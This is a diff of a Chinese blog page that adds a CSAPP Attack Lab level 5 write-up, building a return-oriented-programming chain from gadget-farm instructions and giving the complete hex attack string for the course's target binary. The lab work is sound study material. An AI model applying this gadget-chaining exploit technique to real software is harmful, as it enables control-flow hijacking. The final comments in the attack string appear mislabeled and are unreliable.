+<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>方法1: cookie在低地址，利用popq跳过8位cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 指令</span><br><span class="line">mov?	 %rsp, 寄存器x</span><br><span class="line">popq 	除了x往外的任意寄存器</span><br><span class="line">(Nop)</span><br><span class="line">ret</span><br><span class="line"># 对应机器码：</span><br><span class="line">(48) 89 e?</span><br><span class="line">5?</span><br><span class="line">(90)</span><br><span class="line">c3</span><br><span class="line"># (最少2个gadege就搞了)</span><br></pre></td></tr></table></figure>
+<p>搜索了一下，找不到相关字段，方法不可行。</p>
+<p>指南里面给的指令表只有movq、movl、popq、2字节无用指令，我一开始思路局限在这里了，想的焦头烂额。做了以下分析！</p>
+<ol>
+<li>cookie在ascii码在内存中应该是连续存储的。</li>
+<li>cookie的ascii码只能存储在getbuf函数的栈附近，因为我们很难找到匹配cookie的数据，还要搬运到连续的内存地址。</li>
+<li>cookie一旦输入就无法搬运？因为无法实现内存访问。只能传递寄存器值。</li>
+<li>cookie应该在add 0x28, %rsp更高的地址？因为没有加减法和内存地址计算，所以没办法取低位地址，只能在rsp可能的取值区间里索引。</li>
+</ol>
+<p>分析完得出结论，只靠movq、movl、popq、2字节无用指令的话。不！可！能！</p>
+<p>还是得用加减法啊！于是我就从fram.d里面搜索相关指令，查到了现成的指令！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># lea    (%rdi,%rsi,1),%rax</span><br><span class="line"> 41 00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line"> 42   4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line"> 43   4019da:       c3                      retq</span><br></pre></td></tr></table></figure>
+<p>引入了这个，就简单了。接下来是一段很有趣的思维过程，建议独立思考。</p>
+<h3 id="最终思路"><a href="#最终思路" class="headerlink" title="最终思路"></a>最终思路</h3><p>可以用rdi存rsp的地址，rsi存一个偏移量（可以用popq实现，这个值存在栈里，我们可以控制，所以可以访问rsp附近的任何地址。），然后相加得倒cookie地址！然后就搜索相关的指令就行了，这里我从rdi和rsi出发，找相关的指令就行了，但是没有可以把rsp直接送到rdi和rsi的相关匹配，所以，考虑的数据的流动方向，一定是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 先执行</span><br><span class="line">movq %rsp, 某个寄存器</span><br><span class="line">popq 某个寄存器</span><br><span class="line">movq ……</span><br><span class="line">……</span><br><span class="line"># 最后</span><br><span class="line">movq 某个寄存器, %rdi或者%rsi	# rsp地址</span><br><span class="line">movq 某个寄存器, %rdi或者%rsi	# 偏移量</span><br><span class="line">lea    (%rdi,%rsi,1),%rax	# rsp + 偏移量 = cookie地址</span><br></pre></td></tr></table></figure>
+<p>顺藤摸瓜（虽然能实现这个功能的指令非常多！但是farm中的相关操作指令几乎都是唯一的，所以这个过程并不复杂。），找到了如下的指令，只要排好顺序就可以完成了！*值得注意的是：“去rsi的路”只有movl可以用，所以rsi应该存偏移量，rdi存rsp的值。movl会令高位赋值0，这恰好是正数的符号拓展，所以我们只能用正数做偏移量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> # popq %rax </span><br><span class="line"> 13 00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line"> 14   4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line"> 15   4019ad:       c3                      retq</span><br><span class="line"></span><br><span class="line"># movq %rsp, %rax</span><br><span class="line"> 69 0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line"> 70   401a03:       8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line"> 71   401a09:       c3                      retq</span><br><span class="line"></span><br><span class="line"># lea    (%rdi,%rsi,1),%rax</span><br><span class="line"> 41 00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line"> 42   4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line"> 43   4019da:       c3                      retq</span><br><span class="line"> </span><br><span class="line"> #movq %rax, %rdi</span><br><span class="line">  29 00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line"> 30   4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line"> 31   4019c9:       c3                      retq</span><br><span class="line"> </span><br><span class="line"> #movl %ecx,%esi</span><br><span class="line">  89 0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line"> 90   401a25:       8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax # 38 c0是orb %al, %al</span><br><span class="line"> 91   401a2b:       c3                      retq</span><br><span class="line"> </span><br><span class="line"> # movl %edx, ecx</span><br><span class="line">  97 0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line"> 98   401a33:       b8 89 d1 38 c9          mov    $0xc938d189,%eax # 38 c9是cmpb %cl, %cl</span><br><span class="line"> 99   401a38:       c3                      retq</span><br><span class="line"> </span><br><span class="line"> # movl %eax, edx</span><br><span class="line">  45 00000000004019db &lt;getval_481&gt;:</span><br><span class="line"> 46   4019db:       b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line"> 47   4019e0:       c3                      retq</span><br></pre></td></tr></table></figure>
+<p>我的答案如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movq %rsp, %rax	# 将cookie首地址-72的位置传给rax。指令地址:401a06</span><br><span class="line">movq %rax, %rdi	# 将cookie首地址-72的位置传给rdi。指令地址:4019c5</span><br><span class="line">popq %rax		#	+72-&gt;rax。指令地址:4019ab</span><br><span class="line">movl %eax, %edx	# 指令地址:4019dd</span><br><span class="line">movl %edx, %ecx	# 指令地址:401a34</span><br><span class="line">movl %ecx, %esi	# 指令地址:401a27</span><br><span class="line">lea  (%rdi,%rsi,1),%rax	# 恰好计算出cookie的首地址，存到rax。指令地址:4019d6</span><br><span class="line">movq %rax, %rdi	# 将cookie首地址传到rdi，完成任务！指令地址:4019c5</span><br><span class="line">call touch3 # 指令地址:4018fa</span><br></pre></td></tr></table></figure>
+<p>攻击字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">01 02 03 04 05 06 07 08 </span><br><span class="line">09 10 11 12 13 14 15 16 </span><br><span class="line">17 18 19 20 21 22 23 24 </span><br><span class="line">25 26 27 28 29 30 31 32 </span><br><span class="line">33 34 35 36 37 38 39 40 #40个无关字节</span><br><span class="line">06 1a 40 00 00 00 00 00 # movq %rsp, %rax地址</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax, %rdi地址</span><br><span class="line">ab 19 40 00 00 00 00 00 # popq %rax地址</span><br><span class="line">48 00 00 00 ff ff ff ff # 偏移量，高4字节ff ff ff ff部分可以为任意值，我们只要低4位0x48也就是+72</span><br><span class="line">dd 19 40 00 00 00 00 00 # movl %eax, %edx地址</span><br><span class="line">34 1a 40 00 00 00 00 00 # movl %edx, %ecx地址</span><br><span class="line">27 1a 40 00 00 00 00 00 # movl %ecx, %esi地址</span><br><span class="line">d6 19 40 00 00 00 00 00 # lea  (%rdi,%rsi,1),%rax地址</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax, %rdi地址</span><br><span class="line">fa 18 40 00 00 00 00 00 # movq %rax, %rdi地址</span><br><span class="line">35 39 62 39 39 37 66 61 # touch3地址</span><br></pre></td></tr></table></figure>
+<p>level5搞定，恭喜，获得了本lab全部的分数！完结撒花！</p>
 
       
 
@@ -263,7 +537,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">算法设计笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CSAPP</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">lab</a>
         		</li>
       		
 		</ul>
@@ -319,7 +597,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://chuwenda.cn/2019/09/21/算法设计课笔记/优先队列实现/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://chuwenda.cn/2019/10/02/CSAPP_lab/attack_lab/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -333,18 +611,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/22/leetCode题解/串-滑动窗口-leetCode题解/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/10/04/CSAPP_lab/bomb_lab/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          无重复字符的最长子串-滑动窗口
+          CSAPP_Bomb_lab
         
       </div>
     </a>
   
   
-    <a href="/2019/09/15/算法设计课笔记/复杂度描述/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">复杂度描述</div>
+    <a href="/2019/09/22/leetCode题解/串-滑动窗口-leetCode题解/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">无重复字符的最长子串-滑动窗口</div>
       <i class="icon-circle-right"></i>
     </a>
   
